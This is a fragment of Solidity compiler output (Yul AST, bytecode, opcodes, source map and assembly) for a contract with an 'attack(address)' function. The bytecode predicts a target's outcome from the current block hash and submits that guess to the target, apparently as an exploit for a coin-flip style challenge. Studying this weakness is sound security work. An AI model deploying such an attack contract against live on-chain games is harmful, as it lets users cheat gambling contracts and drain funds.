													"nodeType": "YulBlock",
													"src": "2868:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2885:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2888:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2878:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2878:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2878:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2982:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2985:4:3",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2975:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2975:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2975:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3006:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3009:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2999:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2999:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2999:15:3"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2840:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3068:143:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3078:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3101:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3083:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "3083:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "3078:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3112:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3135:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3117:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "3117:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "3112:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3159:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "3161:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3161:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3161:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3156:1:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3149:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "3149:9:3"
															},
															"nodeType": "YulIf",
															"src": "3146:35:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3191:14:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3200:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3203:1:3"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "3196:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "3196:9:3"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "3191:1:3"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "3057:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "3060:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "3066:1:3",
														"type": ""
													}
												],
												"src": "3026:185:3"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n}\n",
									"id": 3,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061004c5760003560e01c80633fe6dd291461005157806379e41b391461006f57806399b084bf1461008d578063d018db3e146100ab575b600080fd5b6100596100c7565b604051610066919061021b565b60405180910390f35b6100776100cd565b6040516100849190610251565b60405180910390f35b6100956100e0565b6040516100a2919061021b565b60405180910390f35b6100c560048036038101906100c091906102cf565b610154565b005b60005481565b600160009054906101000a900460ff1681565b600080434060001c905061011d7f8000000000000000000000000000000000000000000000000000000000000000826101ec90919063ffffffff16565b600081905550600160005414610134576000610137565b60015b600160006101000a81548160ff0219169083151502179055505090565b6000808290508073ffffffffffffffffffffffffffffffffffffffff16631d263f67600160009054906101000a900460ff166040518263ffffffff1660e01b81526004016101a29190610251565b6020604051808303816000875af11580156101c1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101e59190610328565b9150505050565b600081836101fa9190610384565b905092915050565b6000819050919050565b61021581610202565b82525050565b6000602082019050610230600083018461020c565b92915050565b60008115159050919050565b61024b81610236565b82525050565b60006020820190506102666000830184610242565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061029c82610271565b9050919050565b6102ac81610291565b81146102b757600080fd5b50565b6000813590506102c9816102a3565b92915050565b6000602082840312156102e5576102e461026c565b5b60006102f3848285016102ba565b91505092915050565b61030581610236565b811461031057600080fd5b50565b600081519050610322816102fc565b92915050565b60006020828403121561033e5761033d61026c565b5b600061034c84828501610313565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061038f82610202565b915061039a83610202565b9250826103aa576103a9610355565b5b82820490509291505056fea264697066735822122045ecbf8eed1253051153e3bb775e09230f0a51235f93cd23f81fde802cbc159f64736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3FE6DD29 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x79E41B39 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x99B084BF EQ PUSH2 0x8D JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xAB JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x59 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x21B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x77 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x251 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x95 PUSH2 0xE0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA2 SWAP2 SWAP1 PUSH2 0x21B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xC0 SWAP2 SWAP1 PUSH2 0x2CF JUMP JUMPDEST PUSH2 0x154 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 NUMBER BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x11D PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x1EC SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x0 SLOAD EQ PUSH2 0x134 JUMPI PUSH1 0x0 PUSH2 0x137 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A2 SWAP2 SWAP1 PUSH2 0x251 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E5 SWAP2 SWAP1 PUSH2 0x328 JUMP JUMPDEST SWAP2 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1FA SWAP2 SWAP1 PUSH2 0x384 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x215 DUP2 PUSH2 0x202 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x230 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x20C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x24B DUP2 PUSH2 0x236 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x266 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x242 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x29C DUP3 PUSH2 0x271 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AC DUP2 PUSH2 0x291 JUMP JUMPDEST DUP2 EQ PUSH2 0x2B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2C9 DUP2 PUSH2 0x2A3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2E5 JUMPI PUSH2 0x2E4 PUSH2 0x26C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2F3 DUP5 DUP3 DUP6 ADD PUSH2 0x2BA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x305 DUP2 PUSH2 0x236 JUMP JUMPDEST DUP2 EQ PUSH2 0x310 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x322 DUP2 PUSH2 0x2FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x33E JUMPI PUSH2 0x33D PUSH2 0x26C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x34C DUP5 DUP3 DUP6 ADD PUSH2 0x313 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x38F DUP3 PUSH2 0x202 JUMP JUMPDEST SWAP2 POP PUSH2 0x39A DUP4 PUSH2 0x202 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x3AA JUMPI PUSH2 0x3A9 PUSH2 0x355 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASLIMIT 0xEC 0xBF DUP15 0xED SLT MSTORE8 SDIV GT MSTORE8 0xE3 0xBB PUSH24 0x5E09230F0A51235F93CD23F81FDE802CBC159F64736F6C63 NUMBER STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "89:615:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;152:28;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;187:20;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;214:319;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;539:162;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;152:28;;;;:::o;187:20::-;;;;;;;;;;;;;:::o;214:319::-;266:7;285:20;326:12;316:23;308:32;;285:55;;367:95;384:77;367:12;:16;;:95;;;;:::i;:::-;351:13;:111;;;;505:1;488:13;;:18;:33;;516:5;488:33;;;509:4;488:33;477:8;;:44;;;;;;;;;;;;;;;;;;274:259;214:319;:::o;539:162::-;593:11;623:10;645:9;623:32;;675:1;:6;;;682:8;;;;;;;;;;;675:16;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;666:25;;582:119;;539:162;:::o;3969:98:2:-;4027:7;4058:1;4054;:5;;;;:::i;:::-;4047:12;;3969:98;;;;:::o;7:77:3:-;44:7;73:5;62:16;;7:77;;;:::o;90:118::-;177:24;195:5;177:24;:::i;:::-;172:3;165:37;90:118;;:::o;214:222::-;307:4;345:2;334:9;330:18;322:26;;358:71;426:1;415:9;411:17;402:6;358:71;:::i;:::-;214:222;;;;:::o;442:90::-;476:7;519:5;512:13;505:21;494:32;;442:90;;;:::o;538:109::-;619:21;634:5;619:21;:::i;:::-;614:3;607:34;538:109;;:::o;653:210::-;740:4;778:2;767:9;763:18;755:26;;791:65;853:1;842:9;838:17;829:6;791:65;:::i;:::-;653:210;;;;:::o;950:117::-;1059:1;1056;1049:12;1196:126;1233:7;1273:42;1266:5;1262:54;1251:65;;1196:126;;;:::o;1328:96::-;1365:7;1394:24;1412:5;1394:24;:::i;:::-;1383:35;;1328:96;;;:::o;1430:122::-;1503:24;1521:5;1503:24;:::i;:::-;1496:5;1493:35;1483:63;;1542:1;1539;1532:12;1483:63;1430:122;:::o;1558:139::-;1604:5;1642:6;1629:20;1620:29;;1658:33;1685:5;1658:33;:::i;:::-;1558:139;;;;:::o;1703:329::-;1762:6;1811:2;1799:9;1790:7;1786:23;1782:32;1779:119;;;1817:79;;:::i;:::-;1779:119;1937:1;1962:53;2007:7;1998:6;1987:9;1983:22;1962:53;:::i;:::-;1952:63;;1908:117;1703:329;;;;:::o;2038:116::-;2108:21;2123:5;2108:21;:::i;:::-;2101:5;2098:32;2088:60;;2144:1;2141;2134:12;2088:60;2038:116;:::o;2160:137::-;2214:5;2245:6;2239:13;2230:22;;2261:30;2285:5;2261:30;:::i;:::-;2160:137;;;;:::o;2303:345::-;2370:6;2419:2;2407:9;2398:7;2394:23;2390:32;2387:119;;;2425:79;;:::i;:::-;2387:119;2545:1;2570:61;2623:7;2614:6;2603:9;2599:22;2570:61;:::i;:::-;2560:71;;2516:125;2303:345;;;;:::o;2654:180::-;2702:77;2699:1;2692:88;2799:4;2796:1;2789:15;2823:4;2820:1;2813:15;3026:185;3066:1;3083:20;3101:1;3083:20;:::i;:::-;3078:25;;3117:20;3135:1;3117:20;:::i;:::-;3112:25;;3156:1;3146:35;;3161:18;;:::i;:::-;3146:35;3203:1;3200;3196:9;3191:14;;3026:185;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "200600",
								"executionCost": "245",
								"totalCost": "200845"
							},
							"external": {
								"attack(address)": "infinite",
								"guessTheCurrentBlockValue()": "infinite",
								"guessing()": "2471",
								"guessingValue()": "2407"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 89,
									"end": 704,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 89,
									"end": 704,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122045ecbf8eed1253051153e3bb775e09230f0a51235f93cd23f81fde802cbc159f64736f6c634300080d0033",
									".code": [
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "3FE6DD29"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "79E41B39"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "99B084BF"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "D018DB3E"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 89,
											"end": 704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 89,
											"end": 704,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 152,
											"end": 180,
